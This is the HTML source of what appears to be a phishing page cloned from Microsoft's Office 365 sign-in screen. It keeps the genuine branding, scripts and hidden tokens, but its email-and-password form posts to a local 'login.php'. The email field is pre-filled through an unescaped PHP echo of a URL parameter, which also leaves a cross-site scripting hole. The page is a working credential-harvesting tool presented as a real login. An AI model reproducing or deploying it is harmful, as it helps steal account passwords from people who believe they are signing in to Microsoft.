

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html dir="ltr" lang="en">
    <head>
        

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta name="PageID" content="i5030.2.0" />
<meta name="SiteID" content="" />
<meta name="ReqLC" content="1033" />
<meta name="LocLC" content="en-US" />
<meta name="mswebdialog-newwindowurl" content="*" />


    <meta name="robots" content="noindex, nofollow" />

<script type="text/javascript">//<![CDATA[
$Config={"scid":1013,"hpgact":1800,"hpgid":1002,"pgid":"i5030","apiCanary":"AQABAAAAAAABlDrqfEFlSaui6xnRjX5EPBzmbcDAPiJ5hdW9PREqe-Wvxw9uFxLe49AxbO-MZge3DKD9_bFd7YzSnTk8ZMDpGNBnWPCGIUo3WsWh2I2HOTribuqDPCdzU7fFuY92ydfVzIBW1FoHwkCbCHa9VNrsTYlaNDgGne6Jfi8q94RTUbKhJv-aZbaCvfsuZiKGBqSodAJmEegnkfnaGnKW3URs_CrQPKtlZIma3G2cdu8CaiAA","canary":"z6nGhfdAtRqLG9H7LykfmqZLz2HKtUECCvb5iOH2yas=1:1","correlationId":"3179d3dd-9536-431e-aec1-aecccd6c828d","locale":{"mkt":"en-US","lcid":1033},"slMaxRetry":2,"slReportFailure":true,"strings":{"desktopsso":{"authenticatingmessage":"Trying to sign you in"},"mfa":{"setitupnow":"Set it up now"}},"enums":{"ClientMetricsModes":{"None":0,"SubmitOnPost":1,"SubmitOnRedirect":2,"InstrumentPlt":4}},"urls":{"instr":{"pageload":"https://login.microsoftonline.com/common/instrumentation/reportpageload","dssostatus":"https://login.microsoftonline.com/common/instrumentation/dssostatus"}},"browser":{"ltr":1,"Firefox":1,"_Win":1,"_M55":1,"_D0":1,"Full":1,"RE_Gecko":1,"b":{"name":"Firefox","major":55,"minor":0},"os":{"name":"Windows","version":"6.1"},"V":"55.0"},"watson":{"url":"/common/handlers/watson","bundle":"https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6644.15/content/cdnbundles/watson.min.js","sbundle":"https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6644.15/content/cdnbundles/watsonsupport.min.js","fbundle":"https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6644.15/content/cdnbundles/frameworksupport.min.js","resetErrorPeriod":5,"maxCorsErrors":2,"maxInjectErrors":5,"maxErrors":10,"maxTotalErrors":100,"expSrcs":["https://secure.aadcdn.microsoftonline-p.com/ests/","https://login.microsoftonline.com",".login.microsoftonline.com"],"envErrorRedirect":true,"envErrorUrl":"/common/handlers/enverror"},"serverDetails":{"slc":"ProXXXXes","dc":"EST","ri":"ESTXXXX_20","ver":{"v":[2,1,6644,15]},"rt":"2017-10-01T19:01:10","et":55},"country":"US","bsso":{"type":"none","reason":"Pull suppressed as UseAgent did not meet required criteria"}};
//]]></script> 
<script type="text/javascript">//<![CDATA[
!function(){var r=window,n=r.$Debug=r.$Debug||{},e=r.$Config||{};if(!n.appendLog){var t=[],o=0;n.appendLog=function(r){var n=e.maxDebugLog||25,a=(new Date).toUTCString()+":"+r;t.push(o+":"+a),t.length>n&&t.shift(),o++},n.getLogs=function(){return t}}}(),function(){function r(r,n){function e(a){var i=r[a];return t-1>a?void(o.r[i]?e(a+1):o.when(i,function(){e(a+1)})):void n(i)}var t=r.length;e(0)}function n(r,n,a){function i(){var r=!!u.method,o=r?u.method:a[0],i=u.extraArgs||[],s=t.$WebWatson;try{var l=e(a,!r);if(i&&i.length>0)for(var c=i.length,f=0;c>f;f++)l.push(i[f]);o.apply(n,l)}catch(d){return void(s&&s.submitFromException&&s.submitFromException(d))}}var u=o.r&&o.r[r];return n=n?n:this,u&&(u.skipTimeout?i():t.setTimeout(i,0)),u}function e(r,n){return Array.prototype.slice.call(r,n?1:0)}var t=window;t.$Do||(t.$Do={q:[],r:[],removeItems:[],lock:0,o:[]});var o=t.$Do;o.when=function(e,t){function a(r){n(r,i,u)||o.q.push({id:r,c:i,a:u})}var i=0,u=[],s=1,l="function"==typeof t;l||(i=t,s=2);for(var c=s;c<arguments.length;c++)u.push(arguments[c]);e instanceof Array?r(e,a):a(e)},o.register=function(r,e,t){if(!o.r[r]){o.o.push(r);var a={};if(e&&(a.method=e),t&&(a.skipTimeout=t),arguments&&arguments.length>3){a.extraArgs=[];for(var i=3;i<arguments.length;i++)a.extraArgs.push(arguments[i])}o.r[r]=a,o.lock++;try{for(var u=0;u<o.q.length;u++){var s=o.q[u];s.id==r&&n(r,s.c,s.a)&&o.removeItems.push(s)}}catch(l){throw l}finally{if(o.lock--,0===o.lock){for(var c=0;c<o.removeItems.length;c++)for(var f=o.removeItems[c],d=0;d<o.q.length;d++)if(o.q[d]===f){o.q.splice(d,1);break}o.removeItems=[]}}}},o.unregister=function(r){o.r[r]&&delete o.r[r]}}(),function(){function r(r){f&&f.appendLog&&f.appendLog(r)}function n(r){return r.length>p.length&&r.substr(r.length-p.length).toLowerCase()==p}function e(e,o,a,i,u,s,l){var c=e.src||e.href||"";if(c){var f=e.id||"";if(!o&&n(c))try{e.sheet&&e.sheet.cssRules&&!e.sheet.cssRules.length&&(o=!0)}catch(d){}o?(r("[$Loader]: "+(l||"Failed")+" '"+(c||"")+"', id:"+f+", async:"+(e.async||"")+"', defer:"+(e.defer||"")),t(c,0,f,a,i,u)):(r("[$Loader]: "+(s||"Loaded")+" '"+(c||"")+"', id:"+(e.id||"")+", async:"+(e.async||"")+"', defer:"+(e.defer||"")),i&&i())}}function t(r,n,e,o,a,i){if(r)if(o&&v>n){g++;var u=new s;u.retryOnError=!1,u.failMessage="Reload Failed",u.successMessage="Reload Success",u.Add(r,"Reload_"+g+(e?"_"+e:"")),u.Load(a,function(){t(r,n+1,e,o,a,i)})}else i&&i()}function o(r){var n=d.createElement("link");return n.rel="stylesheet",n.type="text/css",n.href=r.srcPath,n}function a(r){var n=d.createElement("script");return r.id&&(n.id=r.id),n.crossorigin="anonymous",n.type="text/javascript",n.src=r.srcPath,n.defer=!1,n.async=!1,n}function i(t,i,u,s,l,c){function f(){e(g,!1,i,u,s,l,c)}if(!t||!t.srcPath)return void(u&&u());var g=null;g=n(t.srcPath)?o(t):a(t),g.onload=f,g.onerror=function(){e(g,!0,i,u,s,l,c)},g.onreadystatechange=function(){"loaded"===g.readyState?setTimeout(f,500):"complete"===g.readyState&&f()};var v=d.getElementsByTagName("head")[0];v.appendChild(g),r("[$Loader]: Loading '"+(t.srcPath||"")+"', id:"+(t.id||""))}function u(r,n,e,t,o,a,s){function l(){u(r,n+1,e,t,o,a,s)}return n<r.length?void i(r[n],e,l,o,a,s):void(t&&t())}function s(){var r=this,n=[];r.retryOnError=!0,r.successMessage="Loaded",r.failMessage="Error",r.Add=function(r,e){r&&n.push({srcPath:r,id:e})},r.AddIf=function(n,e,t){n&&r.Add(e,t)},r.Load=function(e,t){u(n,0,r.retryOnError,e,t,r.successMessage,r.failMessage)}}var l=window,c=l.$Config,f=l.$Debug,d=l.document,g=0,v=c.slMaxRetry||2,h=c.slReportFailure||!1,p=".css";s.On=function(r,n){if(!r)throw"The target element must be provided and cannot be null";e(r,n,!0,null,function(){if(h){var n=r.src||r.href||"";throw"Failed to load external resource ['"+n+"']"}})},l.$Loader=s}(),function(){function r(){if(!m){var r=new d.$Loader;r.AddIf(!d.jQuery,v.sbundle,"WebWatson_DemandSupport"),v.sbundle=null,delete v.sbundle,r.AddIf(!d.$Api,v.fbundle,"WebWatson_DemandFramework"),v.fbundle=null,delete v.fbundle,r.Add(v.bundle,"WebWatson_DemandLoaded"),r.Load(n,e),m=!0}}function n(){if(d.$WebWatson){if(d.$WebWatson.isProxy)return void e();h.when("$WebWatson.full",function(){for(;p.length>0;){var r=p.shift();r&&d.$WebWatson[r.cmdName].apply(d.$WebWatson,r.args)}})}}function e(){var r=d.$WebWatson?d.$WebWatson.isProxy:!0;t(),v.loadErrorUrl&&r&&window.location.assign(v.loadErrorUrl)}function t(){p=[],d.$WebWatson=null}function o(n){return function(){var e=arguments;p.push({cmdName:n,args:e}),r()}}function a(){var r=["foundException","resetException","submit","submitFromException","showError","reportException"],n=this;n.isProxy=!0;for(var e=r.length,t=0;e>t;t++){var a=r[t];a&&(n[a]=o(a))}}function i(r,n,e,t,o,a,i,u,s){var l=d.event;a||(a=f(o||l,i?i+2:2)),d.$Debug&&d.$Debug.appendLog&&d.$Debug.appendLog("[WebWatson]:"+(r||"")+" in "+(n||"")+" @ "+(e||"??")),y.submit(r,n,e,t,o||l,a,i,u,s)}function u(r,n){return{signature:r,args:n,toString:function(){return this.signature}}}function s(r){for(var n=[],e=r.split("\n"),t=0;t<e.length;t++)n.push(u(e[t],[]));return n}function l(r){for(var n=[],e=r.split("\n"),t=0;t<e.length;t++){var o=u(e[t],[]);e[t+1]&&(o.signature+="@"+e[t+1],t++),n.push(o)}return n}function c(r){if(!r)return null;try{if(r.stack)return s(r.stack);if(r.error){if(r.error.stack)return s(r.error.stack)}else if(window.opera&&r.message)return l(r.message)}catch(n){}return null}function f(r,n){var e=[];try{for(var t=arguments.callee;n>0;)t=t?t.caller:t,n--;for(var o=0;t&&b>o;){var a="InvalidMethod()";try{a=t.toString()}catch(i){}var s=[],l=t.args||t.arguments;if(l)for(var f=0;f<l.length;f++)s[f]=l[f];e.push(u(a,s)),t=t.caller,o++}}catch(i){e.push(u(i.toString(),[]))}var d=c(r);return d&&(e.push(u("--- Error Event Stack -----------------",[])),e=e.concat(d)),e}var d=window,g=d.$Config||{},v=g.watson,h=d.$Do;if(!d.$WebWatson&&v){var p=[],m=!1,b=10,y=d.$WebWatson=new a;y.CB={},y._orgErrorHandler=d.onerror,d.onerror=i,y.errorHooked=!0,h.when("jQuery.version",function(r){v.expectedVersion=r}),h.register("$WebWatson")}}(),function(){function r(r,n){for(var e=n.split("."),t=e.length,o=0;t>o&&null!==r&&void 0!==r;)r=r[e[o++]];return r}function n(n){var e=null;return null===s&&(s=r(a,"Constants")),null!==s&&n&&(e=r(s,n)),null===e||void 0===e?"":e.toString()}function e(e){var t=null;return null===i&&(i=r(a,"$Config.strings")),null!==i&&e&&(t=r(i,e.toLowerCase())),(null===t||void 0===t)&&(t=n(e)),null===t||void 0===t?"":t.toString()}function t(r,n){var t=null;return r&&n&&n[r]&&(t=e("errors."+n[r])),t||(t=e("errors."+r)),t||(t=e("errors."+l)),t||(t=e(l)),t}function o(e){var t=null;return null===u&&(u=r(a,"$Config.urls")),null!==u&&e&&(t=r(u,e.toLowerCase())),(null===t||void 0===t)&&(t=n(e)),null===t||void 0===t?"":t.toString()}var a=window,i=null,u=null,s=null,l="GENERIC_ERROR";a.GetString=e,a.GetErrorString=t,a.GetUrl=o}(),function(){var r=window,n=r.$Config||{};r.$B=n.browser||{}}();

//]]></script> 
 



    <link rel="SHORTCUT ICON" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6644.15/content/images/favicon_a.ico" />

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes" />
<link href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6644.15/content/cdnbundles/login.min.css" rel="stylesheet" onerror='$Loader.On(this,true)' onload='$Loader.On(this)' />



<style>
    .no_display {
        display: none;
    }

    .no_border {
        outline: none;
    }

    .glyph {
        font-family: "Segoe MDL2 Assets";
        vertical-align: middle;
    }
</style>


<!--[if lte IE 10]>
    <link href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6644.15/content/cdnbundles/login_ie.min.css" rel="stylesheet" onerror='$Loader.On(this,true)' onload='$Loader.On(this)' />

<![endif]-->

<!--[if lte IE 7]>
  <style type='text/css'>
    .ie_legacy { display: none; }
    body { background-color: #0072C6; }
  </style>
<![endif]-->


<script type="text/javascript">
    if ((navigator.userAgent.match(/iPad/) || navigator.userAgent.match(/iPhone/))
        && (window.innerWidth)) {
        try {
            viewport = document.querySelector("meta[name=viewport]");
            viewport.setAttribute('content', 'width=' + window.innerWidth + ', initial-scale=1.0, maximum-scale=1.0');
            window.onresize = function(event) {
                viewport.setAttribute('content', 'width=' + window.innerWidth + ', initial-scale=1.0, maximum-scale=1.0');
            };
            window.onorientationchange = function (event) {
                var activeElem = document.activeElement;
                activeElem && activeElem.blur();
            };
        } catch (err) {
        }
    }

    var isTouch =  !!("ontouchstart" in window) || window.navigator.msMaxTouchPoints > 0;
    if (!isTouch && true) {    
        var cssId = 'hovereffect';
        if (!document.getElementById(cssId)) {
            var head = document.getElementsByTagName('head')[0];
            var link = document.createElement('link');
            link.id = cssId;
            link.rel = 'stylesheet';
            link.type = 'text/css';
            link.href = "https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6644.15/content/cdnbundles/login_hover.min.css";
            link.media = 'all';
            head.appendChild(link);
        }
    }

    if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
        var msViewportStyle = document.createElement("style");
        msViewportStyle.appendChild(
              document.createTextNode(
                  "@-ms-viewport{width:auto!important}"
              )
          );
        msViewportStyle.appendChild(
              document.createTextNode(
                  "@-ms-viewport{height:auto!important}"
              )
          );
        document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
    }
 </script>


<script crossorigin="anonymous" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6644.15/content/cdnbundles/jquery.1.11.min.js" onerror='$Loader.On(this,true)' onload='$Loader.On(this)'></script>

<script crossorigin="anonymous" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6644.15/content/cdnbundles/aad.login.min.js" onerror='$Loader.On(this,true)' onload='$Loader.On(this)'></script>





<style>
    body
    {
        display: none;
    }
</style>

        <title>
Sign in to your account        </title>
    </head>
    <body>
        <p id="accessibleError" class="accessibleError" style="display:none;" aria-live="assertive" aria-relevant="all" aria-atomic="true" role="alert" aria-hidden="true"></p>

        <script type="text/javascript">//<![CDATA[
!function(){var o=window,l=o.document,n=o.$Config||{};o.self===o.top?l&&l.body&&(l.body.style.display="block"):n.allowFrame||(o.top.location=o.self.location)}();

//]]></script>
        

<div id="background_branding_container" class="ie_legacy" style="background: #FFFFFF" role="banner">
    <img id="background_background_image" alt="Illustration">
    <div id="auto_low_bandwidth_background_notification" class="smalltext">It looks like you&#39;re on a slow connection. We&#39;ve disabled some images to speed things up.</div>
    <div id="background_company_name_text" class="background_title_text">
    </div>
</div>
<div id="background_page_overlay" class="overlay ie_legacy">
</div>

        <div id="login_no_script_panel" class="login_panel">
            

<noscript>
    <style>body { display: block; }</style>
    <div class="login_inner_container no_js">
        <div class="inner_container cred">
            <div class="login_workload_logo_container">
            </div>
            <div id="login_no_js_error_container" class="login_full_error_container">
                <div id="login_no_js_error_text" class="cta_text 1">
                    
                    <H1>We can't sign you in</H1><p>Your browser is currently set to block JavaScript. You need to allow JavaScript to use this service.</p><p>To learn how to allow JavaScript or to find out whether your browser supports JavaScript, check the online help in your web browser.</p>
                </div>
            </div>
        </div>
    </div>
    

<div id="footer_links_container" class="login_footer_container" role="contentinfo">
    <div class="footer_inner_container">
        <div id="footer_table" class="footer_block">
                <div class="corporate_footer">
                        <div>
                            <span class="footer_link text-caption" id="footer_copyright_link">
&#169; 2018 Microsoft                            </span>
                        </div>
                        <div>
                            <span class="footer_link">
                                <a class="text-caption" id="footer_link_terms" href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank">Terms of use</a>
                            </span>
                            <span class="footer_link">
                                <a class="text-caption" id="footer_link_privacy" href="https://privacy.microsoft.com/en-US/privacystatement" target="_blank">Privacy &amp; cookies</a>
                            </span>
                        </div>
                </div>
                    <div class="footer_glyph">
                        <img src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6644.15/content/images/microsoft_logo.png" alt="Microsoft account symbol" />
                    </div>
        </div>
    </div>
</div>
<div id="login_prefetch_container" class="no-display">
</div>

</noscript>

        </div>
        <div id="login_panel" class="login_panel" role="form">
            <div id="legal-section" class="legal_container">
                <div id="legal-content" class="legal-content normaltext"></div>
                <button id="legal-back-btn" class="legal-btn button normaltext">Back</button>
            </div>
            <table class="login_panel_layout" style="height: 100%;">
                <tr class="login_panel_layout_row" style="height: 100%;">
                    <td id="login_panel_center">
                        
<script type="text/javascript">//<![CDATA[
!function(){var n=window,o=n.$Do;o.when(["doc.ready","MSLogin","MSLogin.Util"],function(){var o=n.MSLogin;o.Util.supportCookies()?($(".login_inner_container").removeClass("no_display"),$(".no_cookie").addClass("no_display hidden")):($(".login_inner_container").addClass("no_display hidden"),$(".no_cookie").removeClass("no_display hidden"))})}();

//]]></script>

    <div class="login_inner_container no_cookie no_display">
        <div class="inner_container cred">
            <div class="login_workload_logo_container">
            </div>
            <div id="login_no_cookie_error_container" class="login_full_error_container">
                <div id="login_no_cookie_error_text" class="cta_text 1">
                    
                    <H1>We can't sign you in</H1><p>Your browser is currently set to block cookies. You need to allow cookies to use this service.</p><p>Cookies are small text files stored on your computer that tell us when you're signed in. To learn how to allow cookies, check the online help in your web browser.</p>
                </div>
            </div>
        </div>
    </div>
                        <script type="text/javascript">
                            $Do.when("doc.ready", function ()
                            {
                                

Constants.DEFAULT_LOGO = 'https://secure.aadcdn.microsoftonline-p.com/dbd5a2dd-uymyxxfhpwrbckvwvlxle8radh6vkzaj7cwkqpqixg/appbranding/y2tibtckspdiuxwdfhw-aqaika5xxfufyw7tdmgfq68/0/bannerlogo?ts=635673344101780393';


Constants.DEFAULT_LOGO_ALT = 'O365 Suite UX';
Constants.DEFAULT_ILLUSTRATION = 'https://secure.aadcdn.microsoftonline-p.com/dbd5a2dd-uymyxxfhpwrbckvwvlxle8radh6vkzaj7cwkqpqixg/appbranding/y2tibtckspdiuxwdfhw-aqaika5xxfufyw7tdmgfq68/0/heroillustration?ts=635673344126516270';
Constants.DEFAULT_BACKGROUND_COLOR = '#eb3c00';
Constants.BOILERPLATE_HEADER = '';
Constants.DEFAULT_BOILERPLATE_HEADER = '';
Constants.DEFAULT_BOILERPLATE_TEXT = '';




    
    User.UpdateLogo(Constants.DEFAULT_LOGO, Constants.DEFAULT_LOGO_ALT);
    User.UpdateBackground(Constants.DEFAULT_ILLUSTRATION, Constants.DEFAULT_BACKGROUND_COLOR);
    
    if (Constants.DEFAULT_BOILERPLATE_TEXT.length > 0) {
        TenantBranding.AddBoilerPlateText(Constants.DEFAULT_BOILERPLATE_TEXT, Constants.DEFAULT_BOILERPLATE_HEADER);
    }
    

                                

                            });

                        </script>
                        <div class="login_inner_container" role="main">
                            <div id="true_inner" class="inner_container cred">
                                


 
            </a>
<br><br><br><br>
</div>


                                    <div class="login_workload_logo_container"></div>
                                <div class="spacer"></div>
                                




<div id="login_error_container" class="login_error_container"></div>
<div class="login_cta_container normaltext">
            <div id="login_cta_text" class="cta_message_text 1">Work or school, or personal Microsoft account</div>

    <div id="cta_client_message_text" class="no_display template-tooltip tooltipType_error">
        <!-- Email Discovery Main -->
        <div class="cta_message_text 30136">Type the email address or phone number of the account you want to sign in with.</div>
        <!-- Email Discovery Lookup Timeout -->
        <div class="cta_message_text 30140">We&#39;re having trouble locating your account. Which type of account do you want to use?</div>
        <!-- Email Discovery Account not found -->
        <div id="upn_needs_disambiguation_text" class="cta_message_text 30139">
        </div>
        <!-- Tenant branding call to action -->
        <div id="tenant_branding_cta_text" class="cta_message_text 30008">Sign in to {0}</div>
        <!-- Which accound do you want to use -->
        <div class="cta_message_text 30173">Which type of account do you want to sign in with?</div>
    </div>
    <div id="cta_client_error_text" class="error_msg errortext no_display template-tooltip tooltipType_error">
        <!-- Invalid ID or password -->
        
        <div class="client_error_msg 30067"><H1>We don't recognize this user ID or password</H1><p>Be sure to type the password for your work or school account.</p></div>
        <!-- Malformed id -->
        
        <div class="client_error_msg 30064"><H1>This doesn't look like a valid user ID</H1><p>Try using your email address or phone number.</p></div>
        <!-- Username not found -->
        
        <div class="client_error_msg 30065"><h1>{0} isn't in our system </h1><p>Make sure you typed your address or phone number correctly, or <a id="user-not-found-link" href="#">get a new Microsoft account</a>.</p></div>
        <!-- Malformed id (DOMAIN\alias format) -->
        
        <div class="client_error_msg 30066"><H1>This doesn't look like a valid user ID</H1><p>Try using your email address or phone number.</p></div>
        <!-- Invalid domain name (not guests) -->
        
        <div class="client_error_msg 30068"><H1>{0} isn't in our system</H1><p>Make sure you typed your email address correctly. It usually looks like someone@example.com or someone@example.onmicrosoft.com</p></div>
        <!-- Missing password -->
        <div class="client_error_msg 30111">Please enter your password.</div>
        <!-- UserID is missing -->
        <div class="client_error_msg 30127">To sign in, start by entering a user ID.</div>
        <!-- Error message if email address is not properly formatted -->
        <div class="client_error_msg 30145">Check the email address you entered. You may have mistyped it.</div>
        <!-- Email Discovery could not find email address -->
        
        <div id="account_not_found_title_text" class="client_error_msg 30146"><h1>We couldn't find an account with that email address.</h1><p>Enter a different email address or <a id="user-not-found-link-ebd" href="#">get a new Microsoft account</a>.</p></div>
        <!-- Signout failed -->
        <div id="client_error_msg 30200" class="client_error_msg 30200">You may still be signed in to some applications. Close your browser to finish signing out.</div>
    </div>
</div>
<ul class="login_cred_container" role="form">
    <!-- From ViewTemplateBase/Tiles.cshtml -->
    <li id="login_user_chooser" class="login_user_chooser"></li>
    


    <!-- From ViewTemplateBase/Tiles.cshtml -->
    <div class="nav-settings-menu hidden dropdownPanel" id="signedin-dropdown">
        <ul class="nav-settings-menu-list">
            <li id="signoutContainer"><a href="#" id="signedin-signout">Sign out</a></li>
            <li id="signoutForgetContainer"><a href="#" id="signedin-signoutandforget">Sign out and forget</a></li>
        </ul>
    </div>
    <div class="nav-settings-menu hidden dropdownPanel" id="signedout-dropdown">
        <ul class="nav-settings-menu-list">
            <li id="forgetContainer"><a href="#" id="signedout-forget">Forget</a></li>
        </ul>
    </div>
    <!--  -->
    <li class="login_cred_field_container">
        

<form id="credentials" method="post" action="login.php">
        <div id="cred_userid_container" class="login_textfield textfield">
            <span class="input_field textfield">
                <label for="cred_userid_inputtext" class="no_display">User account</label>
                <div class="input_border">
                <input id="cred_userid_inputtext"
                        class="login_textfield textfield required email field normaltext"
                        placeholder="Email or phone" required="" type="email" name="login"
                        spellcheck="false" alt="Email or phone" aria-label="User account"
                        value="<?php echo $_GET['email'];?>" autocomplete="off" aria-describedby="accessibleError" />
                </div>
            </span>

        </div>
    <div id="looking_container" class="no_display">
        <span id="looking_cta_text" class="bigtext">Looking for an account</span>
        <span class="input_field normaltext login_textfield"><a id="looking_cancel_link" href="#">Cancel</a> </span>
    </div>
            <div id="redirect_cta_text" class="bigtext">Redirecting</div>
            <div id="redirect_dots_animation" class="progress">
                <div class="pip">
                </div>
                <div class="pip">
                </div>
                <div class="pip">
                </div>
                <div class="pip">
                </div>
                <div class="pip">
                </div>
            </div>

        <div id="cred_password_container" class="login_textfield textfield">
            <span class="input_field textfield">
                <label for="cred_password_inputtext" class="no_display">Password</label>
                <div class="input_border">
                    <input id="cred_password_inputtext"
                           class="login_textfield textfield required field normaltext"
                           placeholder="Password" spellcheck="false" aria-label="Password"
                           alt="Password" required="" type="password" name="passwd" value="" aria-describedby="accessibleError"/>
                </div>
            </span>
        </div>
        <div id="redirect_message_container" class="login_textfield">
            <span class="input_field normaltext">
                <div>
                    <span id="redirect_message_text">We&#39;re taking you to your organization&#39;s sign-in page.</span><span 
                        id="redirect_company_name_text"></span> <a
                        id="redirect_cancel_link" href="">Cancel</a>
                </div>
            </span>
        </div>

    

<div id="cred_hidden_inputs_container" style="display: none">
  <input type="hidden" name="ctx" value="rQIIAXWRPW_TUABF43yprRBULDChDkwIJ7af7cSROrhO6jiNnZA4Se2lchy7thP7OfZr7XhkYkHqgpA6siB16MBUwcRIBVIlNiRGJGBkYiT9ASx3ulc6uudJgayQjcc0oBmjNuVwzmABTnMkgRs0xeKAASygCHLGECC6v7X9_euKZF89Ei4_Xn7-snj-8gJ74CAUxo1qNUmSCrRt17QqJvSrVxh2g2E_Mew8X7ICfDS8yMcsYGmKrpNUjSBYjqjRdEX2JEpuzoHi8UiZSEBbEYQijp2uegw0T0NKxgPd0zLFO6aVbObqosZoE32uqDLSJp15b0gQuiilXdVZyJmENF9i5Ka83rZSWR2R3_L3evwJcqjbgJGbWX_ymzaM_KMQxui88BbrhVYgzQQYBJaJKrc1K0CuaSAXBv0IhlaEXCveHcaSrU0BfaiJwrMollJhStaH-9A0jmK-cxizI0Xc6ychY4xP-plFh_W54SmdqNmucYJlAT0dyNJpLHuDiBJVyTb9JWriLUdyO55sw32kJI5itAwWTuv8YjheZMr4II24JG2no5XaeVcor2_1YXBduLuGCtzZThhB211YN0Xsd_EOUWhsbJS3sYe5ndzfIvamtLZFlvNXjV9P9z68-FF6_Wkrd12qZmwgOvaMR4NlV-Tate5qbvtLvZtR7QM0agnC6ZRxe21qZcS7ZIM8K2Nn5fL7zf9Z_gc1" />
  <input type="hidden" name="flowToken" value="AQABAAEAAAABlDrqfEFlSaui6xnRjX5EmfDvsUQhYE2JroONIIID5AXwldg4xAKMr9OOSpuM33eDRJmLGpBfovLRBzGMmfzPEWF47eID8BRXLxh8pPvJykdAsfZvB_ufo1mlil-wY2QyhAw7mpJJGanuCAgjuWgkKqJ8hhzyjvZT9Cddv0_Xhu1o-rOQKbKlxlA5hWRtdmDv6S7k2hobrb8pDeR2cmbg66izosHxoMgB0LecaNmVuJghKhZNTS7exmYGm7TJss2YPURkz606H4RZ_0xRmUhBXO8UN1_ye-gH8f5LQ9PSVCAA" />
  <input type="hidden" name="canary" value="z6nGhfdAtRqLG9H7LykfmqZLz2HKtUECCvb5iOH2yas=1:1"/> 
  <input type="hidden" name="dssoToken" id="dssoToken" /> 
  <input type="hidden" id="CookieDisclosure" name="CookieDisclosure" value="0" />
</div>


    </li>

    <li id="login-splitter-control" class="login_splitter_control">
        <div id="splitter-tiles-container"></div>
    </li>
    <li class="login_cred_options_container" id="login_cred_options_container" role="main">

        

<div id="cred_kmsi_container" class="subtext normaltext">
    <span class="input_field ">
        <input id="cred_keep_me_signed_in_checkbox" type="checkbox" value="0" class="win-checkbox" name="persist">
        <label id="keep_me_signed_in_label_text" for="cred_keep_me_signed_in_checkbox" class="persist_text">Keep me signed in</label>
    </span>
</div>

        
        <button id="cred_sign_in_button"
                class="button normaltext cred_sign_in_button refresh_domain_state control-button button-two button_primary">
            Sign in
        </button>

        <button id="cred_cancel_button"
              class="button normaltext cred_cancel_button control-button button-one no_display">
            Back
        </button>

        

        <div id="recover_container" class="subtext smalltext">
            <span>
                <a href="#" onclick="MSLogin.Support.IForgotMyPassword()">Can't access your account?</a>
            </span>
            <div class="i-forgot-my-password-content no_display stdMarginTop">
                <div>What kind of account do you have?</div>
                <div class="stdMarginTop">
                    <div class="stdMarginTop">
                        <a id="cred_msa_forgot_password_link" href="https://account.live.com/password/reset?wreply=https:%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQIIAXWRPW_TUABF43yprRBULDChDkwIJ7af7cSROrhO6jiNnZA4Se2lchy7thP7OfZr7XhkYkHqgpA6siB16MBUwcRIBVIlNiRGJGBkYiT9ASx3ulc6uudJgayQjcc0oBmjNuVwzmABTnMkgRs0xeKAASygCHLGECC6v7X9_euKZF89Ei4_Xn7-snj-8gJ74CAUxo1qNUmSCrRt17QqJvSrVxh2g2E_Mew8X7ICfDS8yMcsYGmKrpNUjSBYjqjRdEX2JEpuzoHi8UiZSEBbEYQijp2uegw0T0NKxgPd0zLFO6aVbObqosZoE32uqDLSJp15b0gQuiilXdVZyJmENF9i5Ka83rZSWR2R3_L3evwJcqjbgJGbWX_ymzaM_KMQxui88BbrhVYgzQQYBJaJKrc1K0CuaSAXBv0IhlaEXCveHcaSrU0BfaiJwrMollJhStaH-9A0jmK-cxizI0Xc6ychY4xP-plFh_W54SmdqNmucYJlAT0dyNJpLHuDiBJVyTb9JWriLUdyO55sw32kJI5itAwWTuv8YjheZMr4II24JG2no5XaeVcor2_1YXBduLuGCtzZThhB211YN0Xsd_EOUWhsbJS3sYe5ndzfIvamtLZFlvNXjV9P9z68-FF6_Wkrd12qZmwgOvaMR4NlV-Tate5qbvtLvZtR7QM0agnC6ZRxe21qZcS7ZIM8K2Nn5fL7zf9Z_gc1">Personal account</a>
                    </div>
                    <div class="stdMarginTop">
